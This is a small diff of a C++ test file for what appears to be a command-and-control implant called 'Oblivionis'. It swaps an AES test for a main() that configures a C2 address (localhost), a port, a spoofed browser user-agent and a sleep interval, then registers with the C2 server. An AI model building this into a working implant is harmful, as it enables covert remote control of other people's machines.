@@ -1,40 +1,25 @@
 #include<cstdio>
 #include<cstdlib>
-#include "OblivionisAES.hpp"
+#include "Network.hpp"
+char configData[1024] = {'a', 'b', 'c', 'd'};
 
-void hexDump(PBYTE data, int len) {
-    for(int i = 0; i < len; i++) {
-        if(i != 0 && i % 16 == 0) {
-            printf("\n");
-        }
-        printf("%02x ", data[i]);
+int main() {
+    OblivionisConfig *config = getConfig();
+    config->c2addr = "127.0.0.1";
+    config->c2port = 8080;
+    config->useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36";
+    config->url = "";
+    config->host = "localhost";
+    config->sleep = 500;
+    config->a = (unsigned char *)malloc(16);
+    printf("a = ");
+    for(int i = 0; i < 16; i++) {
+        config->a[i] = 0x41 + i * 2;
+        printf("%02x ", config->a[i]);
     }
     printf("\n");
-}
-void AESTest() {
-    PBYTE key = (PBYTE)malloc(16);
-    memmove(key, "1234567887654321", 16);
-    const char *message = "abcdefghabcdefghabcdefghabcdefgh1";
-    DWORD mesLen = strlen(message);
-    PBYTE mes = (PBYTE)malloc(mesLen + 16);
-    memmove(mes, message, mesLen);
-
-    OblivionisAES aes = OblivionisAES(key);
-    printf("key = \n");
-    hexDump(aes.g_Key, 176);
-
-    printf("to Encrypt = \n");
-    hexDump(mes, mesLen);
-    aes.EncryptData(mes, &mesLen);
-    printf("encrypt = \n");
-    hexDump(mes, mesLen);
-
-    aes.DecryptData(mes, &mesLen);
-    printf("decrypt = \n");
-    hexDump(mes, mesLen);
-
-    printf("\n%s\n", mes);
-}
-int main() {
-    
+    networkSuitInitial();
+    registerC2();
+    //PostBreath();
+    return 0;
 }
